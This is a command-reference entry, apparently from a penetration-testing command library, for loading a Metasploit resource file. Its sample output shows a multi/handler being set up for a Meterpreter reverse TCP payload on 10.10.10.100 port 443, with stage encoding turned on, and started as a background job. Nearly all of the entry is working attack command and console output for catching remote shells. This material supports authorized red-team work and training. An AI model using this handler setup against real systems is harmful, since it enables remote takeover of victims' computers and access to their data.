---
id: 1d1928fb-3fdb-4a7f-93f1-c00661a51de7
name: Metasploit Load a Resource File
type: command
executor: metasploit
data: msfconsole -r $_FILENAME.rc
output: 'root@kali:~/nps_payload# msfconsole -r msbuild_nps.rc

  ...

  [*] Processing msbuild_nps.rc for ERB directives.

  resource (msbuild_nps.rc)> use multi/handler

  resource (msbuild_nps.rc)> set payload windows/meterpreter/reverse_tcp

  payload => windows/meterpreter/reverse_tcp

  resource (msbuild_nps.rc)> set LHOST 10.10.10.100

  LHOST => 10.10.10.100

  resource (msbuild_nps.rc)> set LPORT 443

  LPORT => 443

  resource (msbuild_nps.rc)> set ExitOnSession false

  ExitOnSession => false

  resource (msbuild_nps.rc)> set EnableStageEncoding true

  EnableStageEncoding => true

  resource (msbuild_nps.rc)> exploit -j -z

  [*] Exploit running as background job 0.

  [*] Exploit completed, but no session was created.


  [*] Started reverse TCP handler on 10.10.10.100:443'
created_at: '2019-11-14T23:38:41.557275+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Metasploit Load a Resource File

```metasploit
msfconsole -r $_FILENAME.rc
```

## Expected Output

```
root@kali:~/nps_payload# msfconsole -r msbuild_nps.rc
...
[*] Processing msbuild_nps.rc for ERB directives.
resource (msbuild_nps.rc)> use multi/handler
resource (msbuild_nps.rc)> set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
resource (msbuild_nps.rc)> set LHOST 10.10.10.100
LHOST => 10.10.10.100
resource (msbuild_nps.rc)> set LPORT 443
LPORT => 443
resource (msbuild_nps.rc)> set ExitOnSession false
ExitOnSession => false
resource (msbuild_nps.rc)> set EnableStageEncoding true
EnableStageEncoding => true
resource (msbuild_nps.rc)> exploit -j -z
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.10.100:443
```


